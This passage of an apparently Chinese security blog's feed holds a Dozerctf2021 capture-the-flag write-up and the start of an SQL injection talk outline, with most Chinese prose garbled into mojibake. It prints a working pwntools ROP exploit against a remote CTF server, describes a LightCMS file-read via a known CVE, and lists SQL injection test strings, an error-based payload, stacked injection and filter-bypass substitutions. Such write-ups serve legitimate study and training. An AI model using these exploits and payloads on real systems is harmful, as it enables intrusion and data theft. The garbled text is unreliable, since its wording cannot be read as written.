id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€åè„šæœ¬è¿˜æ˜¯test1çš„æ–¹å¼æ²¡æœ‰å˜äº†ï¼Œæ—¢ç„¶Pythonæ²¡æœ‰å¯¹è¶Šç•Œåšå•¥è¡¨ç¤ºï¼Œå’±ä¹Ÿå°±è¿™æ ·ç”¨ç€å°±å¥½å•¦</p><p>è¿™æ˜¯èœé¸¡æ‘¸é±¼æ’¸æ’¸å°è„šæœ¬æ—¶å€™é‡åˆ°çš„å°æƒ…å†µï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªå­¦ä¹ è®°å½•å§ï¼Œè¿˜æ²¡æœ‰ç³»ç»Ÿæ€§åœ°å­¦ä¹ Pythonï¼Œå¯èƒ½å­¦åˆ°äº†å°±ä¼šæœ‰æ–¹æ³•å¯ä»¥è§£å†³äº†å§â€¦</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸‹æ’¸è„šæœ¬çš„æ—¶å€™å¤„ç†æ•°æ®ç”¨åˆ°dictæ—¶çš„æœ‰è¶£å‘ç°&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚è°ˆç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Dozerctf2021</title>
    <link href="https://err0r.top/article/dozerctf2021/"/>
    <id>https://err0r.top/article/dozerctf2021/</id>
    <published>2021-05-30T14:08:38.000Z</published>
    <updated>2021-05-30T15:20:45.398Z</updated>
    
    <content type="html"><![CDATA[<p>é˜Ÿä¼åç§°ï¼šæˆˆæˆˆå“¥å“¥ä¸é¸½é¸½</p><a id="more"></a><p>å¤§å¸ˆå‚…ä»¬éƒ½å»æ‰“xctfäº†ï¼Œå‡ ä¸ªæ¯”èµ›é‡æ—¶é—´äº†ï¼Œæ˜¥ç§‹ï¼Œç¾å›¢ï¼Œdasã€‚</p><p>åœ¨å‡ ä¸ªæ¯”èµ›ä¸­ç–¯ç‹‚è¡”æ¥2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ç®€å•åŸŸæ¸—é€â…¡-1"><a href="#ç®€å•åŸŸæ¸—é€â…¡-1" class="headerlink" title="ç®€å•åŸŸæ¸—é€â…¡-1"></a>ç®€å•åŸŸæ¸—é€â…¡-1</h3><p>æ‹¿åˆ°é¢˜Lightcmsï¼Œç›´æ¥æ‰“ã€‚ç›®å‰ç½‘ä¸Šä¸¤ä¸ªæ´ï¼Œä¸€ä¸ªvè·¨ç«™è„šæœ¬æ¼æ´ï¼Œä¸€ä¸ªåå°RCEæ¼æ´<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer/dozer123ç™»é™†åå°</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>åœ¨<code>å†…å®¹ç®¡ç†-&gt;æ–‡ç« -&gt;æ–°å»ºæ–‡ç« å†…å®¹</code>å¤„ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…å¾—åˆ°<code>/admin/neditor/serve/uploadimage</code>è·¯ç”±ï¼Œç„¶ååœ¨<code>/admin/neditor/serve/catchImage</code>è·¯ç”±è¯»å–æ–‡ä»¶ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šRCEæ–‡ç« ï¼Œä¸å¤šé˜è¿°ã€‚<code>file_get_contents</code>ç›´æ¥ç”¨fileåè®®è¯»å–æ ¹ç›®å½•flagï¼Œåæ¥flagè¢«æ”¹åäº†ï¼Œè¿™é‡Œç®—æ˜¯å‰æœŸçš„åšæ³•äº†ã€‚</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>åé¢å³ä½¿æ‹¿åˆ°äº†shellä¹Ÿæ²¡æœ‰è¿›ä¸€æ­¥çªç ´ï¼Œæ‰«ipè¿˜æ‰«é”™äº†</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="æœªå®Œæˆçš„ç½‘ç«™"><a href="#æœªå®Œæˆçš„ç½‘ç«™" class="headerlink" title="æœªå®Œæˆçš„ç½‘ç«™"></a>æœªå®Œæˆçš„ç½‘ç«™</h3><p>çŒœæµ‹ç‚¹</p><p><code>./people/&#123;&#125;</code>å’Œ<code>./download?url=&#123;&#125;</code></p><p>è¯•äº†ä¸‹å‘ç°è¿‡æ»¤äº†<code>[]</code></p><p>ç„¶åç–¯ç‹‚è¢«åŸŸæ¸—é€æŠ˜ç£¨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>å³å¯</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"><a href="#ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§" class="headerlink" title="ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§"></a>ä¸ä¼šæœ‰äººä»¥ä¸ºreé‚£é“æ‰æ˜¯ç­¾åˆ°å§</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>æ‰‹æ¯”è¾ƒå¿«</p><hr><h3 id="åšä¸ªé—®å·å§"><a href="#åšä¸ªé—®å·å§" class="headerlink" title="åšä¸ªé—®å·å§"></a>åšä¸ªé—®å·å§</h3><p>éå¸¸ç®€å•</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>å¬è¯´å›½èµ›æœ‰ä¸€ä¸ªrunning_pixel?</p><p>é‚£å°±ç±»æ¯”ä¸€ä¸‹ï¼Œå‘ç°å‡ å¼ å›¾ç‰‡ç±»ä¼¼ï¼Œçœ‹ä¸€ä¸‹md5ï¼Œå‘ç°ä¸€å…±åªæœ‰6ç§md5ã€‚çŒœæµ‹æ˜¯äºŒè¿›åˆ¶ï¼Œæå‡ºæ¥å‰16ç« ï¼ŒäºŒè¿›åˆ¶ä¸º</p><p><code>01000100</code>==<code>d</code></p><p><code>01101111</code>==<code>o</code></p><p>å¾ˆæ˜æ˜¾æ€è·¯æ­£ç¡®ï¼Œå†™è„šæœ¬å°±è¡Œäº†</p><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5æœˆ 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#åˆ›å»ºmd5å¯¹è±¡</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#æ›´æ–°md5å¯¹è±¡</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#è¿”å›md5å¯¹è±¡</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;é˜Ÿä¼åç§°ï¼šæˆˆæˆˆå“¥å“¥ä¸é¸½é¸½&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥åˆ†äº«</title>
    <link href="https://err0r.top/article/sqlinjection/"/>
    <id>https://err0r.top/article/sqlinjection/</id>
    <published>2021-05-26T05:43:04.000Z</published>
    <updated>2021-06-06T13:32:52.896Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><p>å°äº¤æµä¼šçš„æçº²ï¼Œè®°å½•ä¸‹ï¼Œæ²¡æœ‰é€»è¾‘å¯è¨€</p><p>ä»Šå¹´æœ¬äººå‚åŠ çš„CTFä¸­è®°å½•çš„sqlé¢˜ç›®ï¼Œç”±äºå¯èƒ½æœ‰å¤šç§è§£ï¼Œè¿™é‡Œåˆ—å‡ºæœ¬äººè§£æ³•ä»…ä¾›å‚è€ƒ</p><table><thead><tr><th>æ¯”èµ›-é¢˜ç›®åç§°</th><th>æ³¨å…¥ç±»å‹</th><th>è¯¦ç»†æƒ…å†µ</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹ï¼ŒåŒè¡¨æŸ¥è¯¢</td></tr><tr><td>å›½èµ›CISCN-easy_sql</td><td>ç›²æ³¨ï¼ŒæŠ¥é”™</td><td>sqlmapä¸€æŠŠæ¢­ï¼Œå¸ƒå°”å‹/å»¶æ—¶æ³¨å…¥/æŠ¥é”™æ³¨å…¥ï¼Œæœ€åæ— åˆ—åæ³¨å…¥</td></tr><tr><td>çº¢å¸½æ¯-WebsiteManger</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹(å¼‚æˆ–)/å»¶æ—¶æ³¨å…¥</td></tr><tr><td>çº¢æ˜è°·-happysql</td><td>ç›²æ³¨</td><td>å¸ƒå°”å‹(æ­£åˆ™)ï¼Œæ— åˆ—åæ³¨å…¥</td></tr><tr><td>DASCTFä¸‰æœˆèµ›-bestDB</td><td>è”åˆæ³¨å…¥</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>ç›²æ³¨</td><td>å»¶æ—¶æ³¨å…¥(ç¬›å¡å°”ç§¯)</td></tr><tr><td>HGAME-200OK!</td><td>è”åˆæ³¨å…¥</td><td>åŸºç¡€SQLæ³¨å…¥</td></tr><tr><td>HGAME-Liki-Jail</td><td>ç›²æ³¨</td><td>å»¶æ—¶æ³¨å…¥</td></tr><tr><td>æ˜¥ç§‹æ¯æ–°æ˜¥æ¬¢ä¹èµ›-æŒ‰Fæ³¨å…¥</td><td>è”åˆæ³¨å…¥</td><td>Pgsqlï¼Œå»¶æ—¶æ³¨å…¥(ä¹Ÿè®¸)/ä¿¡æ¯å¤–å¸¦/æ•°æ®åº“å¤–è”</td></tr></tbody></table><p>æ‰“ä¸ªå¹¿å‘Šï¼Œå„æ¯”èµ›çš„WPï¼Œæœ‰éœ€è¦çš„å¸ˆå‚…å¯ä»¥çœ‹çœ‹</p><p><a href="https://err0r.top/article/cqb2021/">æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021å…¬å¼€èµ›</a></p><p><a href="https://err0r.top/article/mardasctf/">SQLæ— åˆ—åæ³¨å…¥</a></p><p><a href="https://err0r.top/article/redhat2021/">çº¢å¸½æ¯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>ç»Ÿè®¡äº†ä¸€ä¸‹ä»Šå¹´çš„SQLæ³¨å…¥é¢˜ç›®ï¼Œå¯èƒ½ä¸å…¨ï¼Œä»ä¸Šè¡¨èƒ½çœ‹å‡ºå¤§éƒ¨åˆ†éƒ½æ˜¯ç›²æ³¨ï¼Œç›²æ³¨çš„é‡è¦æ€§å¯æƒ³è€ŒçŸ¥ã€‚</p><hr><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><ol><li>version()â€”â€”MySQLç‰ˆæœ¬</li><li>user()â€”â€”ç”¨æˆ·å</li><li>database()â€”â€”æ•°æ®åº“å</li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</li><li>@@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</li></ol><p>æœ€å¸¸ç”¨çš„ä¸€èˆ¬æ˜¯<code>database()</code>ï¼Œæœ‰æ—¶å€™æ³¨æ„çœ‹<code>user()</code>ï¼Œæœ‰äº›é¢˜ç›®ç»™çš„æ˜¯rootç”¨æˆ·ï¼Œéœ€è¦ç”¨<code>load_file()</code>è¯»æ–‡ä»¶ï¼Œä¸‹é¢å¼€å§‹æ³¨å…¥å‡†å¤‡</p><hr><h2 id="æµ‹è¯•æ³¨å…¥"><a href="#æµ‹è¯•æ³¨å…¥" class="headerlink" title="æµ‹è¯•æ³¨å…¥"></a>æµ‹è¯•æ³¨å…¥</h2><table><thead><tr><th>æµ‹è¯•å­—ç¬¦ä¸²</th><th>å˜  ç§</th><th>é¢„ æœŸ ç»“ æœ</th></tr></thead><tbody><tr><td>â€˜</td><td></td><td>è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯</td></tr><tr><td>1â€™ or â€˜1â€™=â€™1</td><td>1â€™) or (â€˜1â€™=â€™1</td><td>æ°¸çœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ</td></tr><tr><td>valueâ€™ or â€˜1â€™=â€™2</td><td>valueâ€™) or (â€˜1â€™=â€™2</td><td>ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ</td></tr><tr><td>1â€™ and â€˜1â€™=â€™2</td><td>1â€™) and (â€˜1â€™=â€™2</td><td>æ°¸å‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™+â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b</td><td>SQL Serverå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™ â€˜b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™ â€˜b</td><td>MySQLå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™â€–â€™b</td><td>Oracleå­—ç¬¦ä¸²è¿æ¥ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸æ°¸çœŸæ¡ä»¶ç›¸åŒçš„ä¿¡æ¯</td></tr></tbody></table><hr><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>ç›²æ³¨ï¼Œå°±æ˜¯æŒ‡æ‰§è¡Œsqlè¯­å¥åè¿”å›å€¼ä¸ç›´æ¥å›æ˜¾åˆ°å‰ç«¯é¡µé¢</p><hr><h2 id="è¿‡æ»¤æƒ…å†µ"><a href="#è¿‡æ»¤æƒ…å†µ" class="headerlink" title="è¿‡æ»¤æƒ…å†µ"></a>è¿‡æ»¤æƒ…å†µ</h2><h3 id="è¿‡æ»¤select"><a href="#è¿‡æ»¤select" class="headerlink" title="è¿‡æ»¤select"></a>è¿‡æ»¤select</h3><p>æ¯”è¾ƒåŠ²çˆ†ï¼Œå¦‚æœæœ‰å›æ˜¾å¯ä»¥æŠ¥é”™æ³¨å…¥æŸ¥å‡ºç®€å•ä¿¡æ¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>/<code>database()</code>/<code>version()</code></p><ul><li>ä½†è¿™ä¸è¡Œï¼Œå¯ä»¥åˆ©ç”¨å †å æ³¨å…¥ç»•è¿‡è¿‡æ»¤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>ç„¶ååˆ©ç”¨é¢„ç¼–è¯‘æ–¹å¼æŸ¥æ•°æ®</p><p>ç»å…¸é¢˜ç›®ï¼š<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019å¼ºç½‘æ¯-éšä¾¿æ³¨</a></p><ul><li><p>æˆ–è€…<code>alter</code>æ”¹è¡¨åï¼Œç„¶åä¸‡èƒ½å¯†ç ç™»é™†å‡ºç»“æœ(å¦‚æœå¯å›æ˜¾çš„è¯)</p></li><li><p>æ®è¯´webç«¯è¿‡æ»¤ä¹Ÿè®¸å¯ä»¥preg_matchå›æº¯é™åˆ¶(æœ‰çš„æƒ…å†µ)</p></li><li><p>åŒè¡¨çš„è¯å¯ä»¥åŒè¡¨æŸ¥è¯¢</p><p>ç›²æ³¨å­—æ®µååˆ©ç”¨<code>left(column,0)</code></p><p>å½“å­˜åœ¨å­—æ®µæ—¶è¿”å›True</p></li></ul><p>åŸºæœ¬è¿‡æ»¤</p><table><thead><tr><th align="center">è¿‡æ»¤</th><th align="center">æ›¿ä»£æ–¹æ³•</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[ç©ºæ ¼]</td><td align="center">/**/æˆ–()æˆ–%0a</td></tr><tr><td align="center">#</td><td align="center">â€“+</td></tr><tr><td align="center">substr()</td><td align="center">mid()ã€substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()ã€bin()ã€ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;ã€&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>æµ‹è¯•å­—ç¬¦ä¸²</th><th>å˜  ç§</th><th>é¢„ æœŸ ç»“ æœ</th></tr></thead><tbody><tr><td>â€˜</td><td></td><td>è§¦å‘é”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªé”™è¯¯</td></tr><tr><td>1â€™ or â€˜1â€™=â€™1</td><td>1â€™) or (â€˜1â€™=â€™1</td><td>æ°¸çœŸæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›è¡¨ä¸­æ‰€æœ‰çš„è¡Œ</td></tr><tr><td>valueâ€™ or â€˜1â€™=â€™2</td><td>valueâ€™) or (â€˜1â€™=â€™2</td><td>ç©ºæ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†è¿”å›ä¸åŸæ¥çš„å€¼ç›¸åŒçš„ç»“æœ</td></tr><tr><td>1â€™ and â€˜1â€™=â€™2</td><td>1â€™) and (â€˜1â€™=â€™2</td><td>æ°¸å‡æ¡ä»¶ã€‚å¦‚æœæˆåŠŸï¼Œå°†ä¸è¿”å›è¡¨ä¸­ä»»ä½•è¡Œ</td></tr><tr><td>1â€™ or â€˜abâ€™=â€™aâ€™+â€™b</td><td>1â€™) or (â€˜abâ€™=â€™aâ€™+â€™b</td><td>SQL 